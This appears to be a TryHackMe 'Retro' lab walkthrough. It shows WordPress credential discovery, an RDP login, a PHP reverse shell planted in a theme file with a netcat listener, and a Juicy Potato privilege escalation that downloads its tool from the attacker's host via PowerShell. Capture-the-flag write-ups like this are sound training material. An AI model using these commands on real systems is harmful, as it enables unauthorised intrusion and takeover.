<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>retro</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>retro</h1><br/><strong><h2>THM: Retro</h2></strong><br /><br /><br /><strong><h3>Nmap Scan</h3></strong><br /><br /><img src="images/20-1.png" alt="images/20-1.png" /><br /><br /><br />Ports Open: <strong>80 (Web Server), 3389 (RDP)</strong><br /><br /><br /><br /><strong><h3>Gobuster Scan</h3></strong><br /><br /><img src="images/20-2.png" alt="images/20-2.png" /><br /><br />Directories Found: <strong>retro</strong><br /><br /><br /><strong><h3>Manual Website Enumeration</h3></strong><br /><br /><img src="images/20-3.png" alt="images/20-3.png" /><br /><br /><br />We manually enumerate through the website to find any useful information.<br /><br />We find a <strong>wordpress login</strong> page. (<strong>http://10.10.200.238/retro/wp-login.php</strong>) <br />Also, all the posts in the webpage are done by someone named <strong>Wade</strong><br /><br />Upon trying the same as username in wordpress login we confirm that <strong>Wade</strong> is indeed a valid user in the wordpress CMS.<br /><br /><strong>http://10.10.200.238/retro/index.php/2019/12/09/ready-player-one/#comment-2</strong><br />Upon checking the recent comments, we find an intresting note.<br /><br /> <img src="images/20-4.png" alt="images/20-4.png" /><br /> <br /> <br /> We get a password like word: <strong>parzival</strong><br /> <br /> <br /><strong> Credentials Found:</strong><br />Username: 	Wade<br />Password:	parzival  <br /> <br /><strong> RDP Login</strong><br /> xfreerdp /dynamic-resolution +clipboard /scale:140 /cert:ignore /v:10.10.200.238 /u:Wade /p:&#39;parzival&#39;<strong><br /> <br /> </strong><img src="images/20-5.png" alt="images/20-5.png" /><br /> <br /> We get the (<strong>user.txt) </strong>user flag on the desktop.<br /> <strong><br /> Wordpress Login</strong><br /> We try to login to wordpress page. Login was successful. We are inside the wordpress management console now.<br /><br /><img src="images/20-6.png" alt="images/20-6.png" /><br /><br /><strong><h3>Foothold Using Themes in Wordpress Management Console</h3></strong><br /><br />We see 4 themes in <strong>Apperance ---→ Themes</strong><br /><br /><img src="images/20-7.png" alt="images/20-7.png" /><br /><br />We select <strong>Twenty Sixteen</strong> to insert our <strong>php reverse shell.</strong><br /><strong>Note:</strong> Here we need php reverse shell for <strong>windows</strong><br /><strong>https://github.com/ivan-sincek/php-reverse-shell</strong><br /><br />Open the theme in <strong>Apperance ---→ Theme Editor</strong><br />Select any php page. I preferably selected the “<strong>Twenty Sixteen: Main Index Template (index.php)</strong>”<br /><br /><img src="images/20-8.png" alt="images/20-8.png" /><br /><br />1.) We <strong>replace</strong> the existing code with the windows php reverse shell and change the IP and Port in the code accordingly to point to our local attacker machine.<br />2.) <strong>Update file</strong> on the bottom of the page.<br />3.) Then we start netcat listener in our attacker machine.<br /><strong>rlwrap nc -lvnp 7777</strong><br />4.) Open <strong>Apperance ---→ Themes</strong> and do <strong>Live Preview </strong>on <strong>Twenty Sixteen</strong>, we will have gained a connection in our netcat listener.<br /><br /><img src="images/20-9.png" alt="images/20-9.png" /><br /><br /><br /><strong><h3>Privilege Escalation Using SeImpersonatePrivilege</h3></strong><br /><br /><img src="images/20-10.png" alt="images/20-10.png" /><br /><br />As we can see the <strong>“SeImpersonatePrivilege”</strong> is enabled. We did some research.<br />The method captured in CybeXRay guides uses <strong>meterpreter</strong>. i created a meterpreter payload using msfvenom and got a meterpreter shell. However, the technique didn&#39;t work.<br />So i searched online and found the solution as below.<br /><br /><br />Usually if the machine is a Windows 10 with version 1809 or higher, or a Windows Server 2019, we can use something like <strong>Rogue Potato</strong> attack to escalate privileges. Otherwise, we can try a <strong>Juicy Potato</strong> attack. I am not going to enter into details regarding this type of attack, but in order for it to be possible, we need a low privilege account with one of the following privileges:<br /><br />    ‘SeImpersonatePrivilege’<br />    ‘SeAssignPrimaryTokenPrivilege’.<br /><br /><br /><br /><img src="images/20-11.png" alt="images/20-11.png" /><br /><br /><br />So we conclude that the machine is running <strong>Windows Server 2016</strong> (From RDP Session/Our netcat shell) and the user have privileges to leverage our access to SYSTEM using something like a <strong>Juicy Potato</strong> privilege escalation attack.<br /><br />We get the exploit form : <strong>https://github.com/ohpe/juicy-potato/releases/tag/v0.1</strong><br />We <strong>upload</strong> the exploit using a <strong>local python webserver</strong> and <strong>download</strong> &amp; <strong>run</strong> in public <strong>(C:\Users\Public\)</strong> directory.<br />Once the code runs we get administrator privileges.<br /><br /><strong>On Attacker</strong><br />python2 -m SimpleHTTPServer 80<br /><strong>On Target</strong><br />cd C:\Users\public<br />powershell -c Invoke-WebRequest -Uri http://10.11.72.31/JuicyPotato.exe -OutFile JuicyPotato.exe<br /><br /><img src="images/20-12.png" alt="images/20-12.png" /><br /><br /><strong>Running the Exploit</strong><br /><br /><img src="images/20-13.png" alt="images/20-13.png" /><br /><br />We need the <strong>Mandatory arguments</strong> to run the exploit.<br /><br />-t : * (For all)<br />-p: Create a reverse shell program which the exploit will run as administrator (Do using msfvenom and transfer to target machine)<br />-l: We can use 9999 for listen port that exploit will use.<br /><br /><br /><strong>JuicyPotato.exe -t * -p shell.exe -l 9998</strong><br /><img src="images/20-14.png" alt="images/20-14.png" /><br /><br /><br /><img src="images/20-15.png" alt="images/20-15.png" /><br /><br />Now we can get the root flag in the Administrator&#39;s desktop.<br /><br />Thanks!!</div>
</body>
</html>
